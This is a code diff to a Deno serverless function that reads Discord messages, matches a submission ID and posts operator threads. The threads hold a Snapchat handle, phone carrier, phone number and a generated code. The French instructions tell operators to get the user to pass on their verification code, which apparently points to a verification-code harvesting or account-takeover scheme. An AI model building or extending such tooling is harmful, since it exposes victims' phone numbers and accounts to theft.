@@ -6,6 +6,11 @@ const CHANNEL_ID = Deno.env.get('DISCORD_CHANNEL_ID');
 Deno.serve(async (req) => {
   try {
     const base44 = createClientFromRequest(req);
+    const { submissionId } = await req.json();
+
+    if (!submissionId) {
+      return Response.json({ error: 'submissionId required' }, { status: 400 });
+    }
 
     // Récupérer les messages du canal
     const messagesRes = await fetch(
@@ -14,7 +19,7 @@ Deno.serve(async (req) => {
     );
 
     if (!messagesRes.ok) {
-      return Response.json({ error: 'Failed to fetch messages' }, { status: 500 });
+      return Response.json({ status: 'checking' });
     }
 
     const messages = await messagesRes.json();
@@ -48,16 +53,16 @@ Deno.serve(async (req) => {
 
       // Extraire l'ID de la soumission
       const embed = message.embeds?.[0];
-      const submissionId = embed?.footer?.text?.match(/ID: ([a-z0-9]+)/)?.[1];
+      const msgSubmissionId = embed?.footer?.text?.match(/ID: ([a-z0-9]+)/)?.[1];
       const snapchat = embed?.fields?.find((f: any) => f.name === '👤 Utilisateur')?.value?.replace('@', '') || 'Utilisateur';
 
-      if (!submissionId) continue;
+      if (!msgSubmissionId || msgSubmissionId !== submissionId) continue;
 
       // Vérifier si le thread existe déjà pour cette soumission
       const submission = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);
       if (!submission || submission.discord_user_id) {
         // Déjà traité
-        continue;
+        return Response.json({ status: 'code_ready' });
       }
 
       // Générer un code
@@ -86,56 +91,58 @@ Deno.serve(async (req) => {
         }
       );
 
-      if (!threadRes.ok) continue;
+      if (threadRes.ok) {
+        const thread = await threadRes.json();
+        const threadId = thread.id;
 
-      const thread = await threadRes.json();
-      const threadId = thread.id;
-
-      // Ajouter l'utilisateur au thread
-      await fetch(
-        `https://discord.com/api/v10/channels/${threadId}/thread_members/${userId}`,
-        {
-          method: 'PUT',
-          headers: { 'Authorization': `Bot ${BOT_TOKEN}` }
-        }
-      );
-
-      // Envoyer le message dans le thread
-      const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
-      const triggerUrl = `${appUrl}/?trigger=${submissionId}`;
-
-      const threadEmbed = {
-        title: "✅ Tu as pris en charge cette soumission",
-        color: 3447003,
-        fields: [
-          { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
-          { name: "📡 Opérateur", value: submission.operateur, inline: true },
-          { name: "📞 Numéro", value: submission.telephone, inline: true },
-          { name: "🔑 Code", value: `\`${code}\``, inline: false },
+        // Ajouter l'utilisateur au thread
+        await fetch(
+          `https://discord.com/api/v10/channels/${threadId}/thread_members/${userId}`,
           {
-            name: "📝 Instructions",
-            value: `Envoie le code à l'utilisateur et attends qu'il te donne son code de vérification.\n\n[Cliquer ici pour envoyer le code](${triggerUrl})`,
-            inline: false
+            method: 'PUT',
+            headers: { 'Authorization': `Bot ${BOT_TOKEN}` }
           }
-        ]
-      };
+        );
 
-      await fetch(
-        `https://discord.com/api/v10/channels/${threadId}/messages`,
-        {
-          method: 'POST',
-          headers: {
-            'Authorization': `Bot ${BOT_TOKEN}`,
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({ embeds: [threadEmbed] })
-        }
-      );
+        // Envoyer le message dans le thread
+        const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
+        const triggerUrl = `${appUrl}/?trigger=${submissionId}`;
+
+        const threadEmbed = {
+          title: "✅ Tu as pris en charge cette soumission",
+          color: 3447003,
+          fields: [
+            { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
+            { name: "📡 Opérateur", value: submission.operateur, inline: true },
+            { name: "📞 Numéro", value: submission.telephone, inline: true },
+            { name: "🔑 Code", value: `\`${code}\``, inline: false },
+            {
+              name: "📝 Instructions",
+              value: `Envoie le code à l'utilisateur et attends qu'il te donne son code de vérification.\n\n[Cliquer ici pour envoyer le code](${triggerUrl})`,
+              inline: false
+            }
+          ]
+        };
+
+        await fetch(
+          `https://discord.com/api/v10/channels/${threadId}/messages`,
+          {
+            method: 'POST',
+            headers: {
+              'Authorization': `Bot ${BOT_TOKEN}`,
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ embeds: [threadEmbed] })
+          }
+        );
+      }
+
+      return Response.json({ status: 'code_ready' });
     }
 
-    return Response.json({ ok: true });
+    return Response.json({ status: 'checking' });
   } catch (error) {
     console.error('Erreur:', error);
-    return Response.json({ error: error.message }, { status: 500 });
+    return Response.json({ status: 'checking' });
   }
 });
